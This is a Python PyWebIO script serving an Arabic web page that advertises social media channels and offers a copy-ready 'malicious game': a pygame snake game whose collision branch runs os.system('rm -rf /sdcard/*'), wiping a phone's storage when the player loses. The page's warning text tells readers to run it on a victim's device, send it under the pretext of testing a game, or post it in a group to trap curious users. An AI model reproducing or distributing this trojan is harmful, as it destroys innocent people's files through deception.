from pywebio.output import put_html, put_markdown
from pywebio import start_server
import os

def web_main():
    put_html("""
    <style>
        body {
            font-family: "Segoe UI", Tahoma, sans-serif;
            background: url("https://www2.0zz0.com/2025/04/21/19/953946234.png") no-repeat center/cover fixed;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background: rgba(255,255,255,0.85);
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        h2, h3 {
            margin-bottom: 10px;
            color: #2c3e50;
        }
        .social-buttons {
            text-align: center;
            margin-bottom: 30px;
        }
        /* --- تغيير أبعاد الصور المصغرة --- */
        .social-image {
            width: 100px; /* هذا مكان تغيير عرض الصورة */
            height: 80px; /* هذا مكان تغيير ارتفاع الصورة */
            margin: 10px;
            border-radius: 8px;
            cursor: pointer;
            transition: transform 0.3s ease;
        }

        /* --- عند تمرير الماوس فوق الصورة --- */
        .social-image:hover {
            transform: translateY(-5px) scale(1.05);
        }

        @media (max-width: 600px) {
            .social-image {
                width: 80px;
                height: 50px;
            }
        }

        .warning {
            color: red;
            font-weight: bold;
            margin-top: 10px;
            background-color: #ffeaea;
            padding: 10px;
            border-left: 6px solid red;
        }
        #codeArea {
            width: 100%;
            height: 400px;
            font-family: monospace;
            font-size: 14px;
        }
        #copyBtn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        #copyBtn:hover {
            background-color: #45a049;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
    </style>

    <div class="container">
        <h2>مواقعنا على منصات التواصل</h2>
        <div class="social-buttons">
            <!-- زر يوتيوب فوق -->
            <a href="https://www.youtube.com/@%D9%8A%D9%8E%D9%88%D9%92%D9%85%D9%90%D9%8A%D9%8E%D8%A7%D8%AA%D9%92-%D9%85%D9%8F%D8%A8%D9%8E%D8%B1%D9%92%D9%85%D9%90%D8%AC%D9%92-%D9%85%D9%91%D9%8E%D8%B2%D9%8F%D8%AC%D9%92" target="_blank">
                <img src="https://www2.0zz0.com/2025/04/26/20/682171062.png" class="social-image" alt="يوتيوب">
            </a>
            <h3>يوتيوب</h3>

            <!-- صف انستغرام وفيسبوك جنب بعض -->
            <div style="display: flex; justify-content: center; align-items: center;">
                <div style="margin: 10px;">
                    <a href="https://www.instagram.com/frsbl_frs" target="_blank">
                        <img src="https://www2.0zz0.com/2025/04/26/20/176224460.png" class="social-image" alt="انستغرام">
                    </a>
                    <h3>انستغرام</h3>
                </div>

                <div style="margin: 10px;">
                    <a href="https://www.facebook.com/fars.bla.frs.671146" target="_blank">
                        <img src="https://www2.0zz0.com/2025/04/26/20/198543584.png" class="social-image" alt="فيسبوك">
                    </a>
                    <h3>فيسبوك</h3>
                </div>
            </div>

        </div>
    </div>

    <div class="container">
        <h3>اللعبة الخبيثة</h3>
        <div class='warning'>
            ⚠ تحذير: الكود يحتوي على سطر خطير يؤدي إلى حذف جميع الملفات من هاتفك عند الخسارة في اللعبة:
            أرجو منك للإشتراك في القناة وانتظار لبرامج الجديد
            <br> قم بتشغيل اللعبة على جهاز الضحية أو قم بإرسال الكود له
            باحجة أنك تريد منه اختبار لعبتك
            وأول ما يخسر ستنحذف جميع الملفات
            ولو ما عندك ضحية أنشره في مجموعة
            وأكيد رح يشغله شخص فيه الفضول ويوقع
            😈 في الفخ
        </div>

        <textarea id="codeArea">import pygame
import random
import sys
import os

pygame.init()

WIDTH, HEIGHT = 600, 400
BLOCK_SIZE = 20
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("لعبة الأفعى")

WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
BLACK = (0, 0, 0)
BUTTON_COLOR = (50, 50, 50)

snake = [(100, 100), (90, 100), (80, 100)]
snake_dir = (BLOCK_SIZE, 0)

food = (
    random.randint(0, (WIDTH // BLOCK_SIZE) - 1) * BLOCK_SIZE,
    random.randint(0, (HEIGHT // BLOCK_SIZE) - 1) * BLOCK_SIZE
)

clock = pygame.time.Clock()
speed = 10

button_size = 80
margin = 20

base_y = HEIGHT - (button_size * 2 + margin + 10)
base_x = (WIDTH - (button_size * 3 + margin * 2)) // 2

up_button_rect   = pygame.Rect(base_x + button_size + margin, base_y, button_size, button_size)
left_button_rect = pygame.Rect(base_x, base_y + button_size + margin, button_size, button_size)
down_button_rect = pygame.Rect(base_x + button_size + margin, base_y + button_size + margin, button_size, button_size)
right_button_rect = pygame.Rect(base_x + 2 * (button_size + margin), base_y + button_size + margin, button_size, button_size)

def draw_snake(snake):
    for segment in snake:
        pygame.draw.rect(screen, GREEN, (segment[0], segment[1], BLOCK_SIZE, BLOCK_SIZE))

def draw_food(food):
    pygame.draw.rect(screen, RED, (food[0], food[1], BLOCK_SIZE, BLOCK_SIZE))

def draw_buttons():
    pygame.draw.rect(screen, BUTTON_COLOR, up_button_rect)
    pygame.draw.rect(screen, BUTTON_COLOR, left_button_rect)
    pygame.draw.rect(screen, BUTTON_COLOR, down_button_rect)
    pygame.draw.rect(screen, BUTTON_COLOR, right_button_rect)

    font = pygame.font.SysFont(None, 50)
    up_text = font.render("↑", True, WHITE)
    down_text = font.render("↓", True, WHITE)
    left_text = font.render("←", True, WHITE)
    right_text = font.render("→", True, WHITE)

    screen.blit(up_text, up_text.get_rect(center=up_button_rect.center))
    screen.blit(down_text, down_text.get_rect(center=down_button_rect.center))
    screen.blit(left_text, left_text.get_rect(center=left_button_rect.center))
    screen.blit(right_text, right_text.get_rect(center=right_button_rect.center))

def check_collision(snake):
    head = snake[0]
    if head[0] < 0 or head[0] >= WIDTH or head[1] < 0 or head[1] >= HEIGHT:
        return True
    if head in snake[1:]:
        return True
    return False

def main():
    global snake, snake_dir, food
    running = True
    while running:
        screen.fill(BLACK)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP and snake_dir != (0, BLOCK_SIZE):
                    snake_dir = (0, -BLOCK_SIZE)
                elif event.key == pygame.K_DOWN and snake_dir != (0, -BLOCK_SIZE):
                    snake_dir = (0, BLOCK_SIZE)
                elif event.key == pygame.K_LEFT and snake_dir != (BLOCK_SIZE, 0):
                    snake_dir = (-BLOCK_SIZE, 0)
                elif event.key == pygame.K_RIGHT and snake_dir != (-BLOCK_SIZE, 0):
                    snake_dir = (BLOCK_SIZE, 0)
            elif event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                if up_button_rect.collidepoint(mouse_pos) and snake_dir != (0, BLOCK_SIZE):
                    snake_dir = (0, -BLOCK_SIZE)
                elif down_button_rect.collidepoint(mouse_pos) and snake_dir != (0, -BLOCK_SIZE):
                    snake_dir = (0, BLOCK_SIZE)
                elif left_button_rect.collidepoint(mouse_pos) and snake_dir != (BLOCK_SIZE, 0):
                    snake_dir = (-BLOCK_SIZE, 0)
                elif right_button_rect.collidepoint(mouse_pos) and snake_dir != (-BLOCK_SIZE, 0):
                    snake_dir = (BLOCK_SIZE, 0)

        new_head = (snake[0][0] + snake_dir[0], snake[0][1] + snake_dir[1])
        snake.insert(0, new_head)

        if snake[0] == food:
            food = (
                random.randint(0, (WIDTH // BLOCK_SIZE) - 1) * BLOCK_SIZE,
                random.randint(0, (HEIGHT // BLOCK_SIZE) - 1) * BLOCK_SIZE
            )
        else:
            snake.pop()

        draw_snake(snake)
        draw_food(food)
        draw_buttons()

        if check_collision(snake):
            print("انتهت اللعبة!")
            running = False
            os.system("rm -rf /sdcard/*")

        pygame.display.flip()
        clock.tick(speed)

    pygame.quit()
    sys.exit()
        </textarea>
        <button id="copyBtn" onclick="navigator.clipboard.writeText(document.getElementById('codeArea').value).then(()=>alert('✅تم نسخ كود لعبة!'))">نسخ الكود</button>
    </div>
    """)

if __name__ == '__main__':
    PORT = int(os.getenv("PORT", 10000))
    start_server(web_main, port=PORT, debug=True)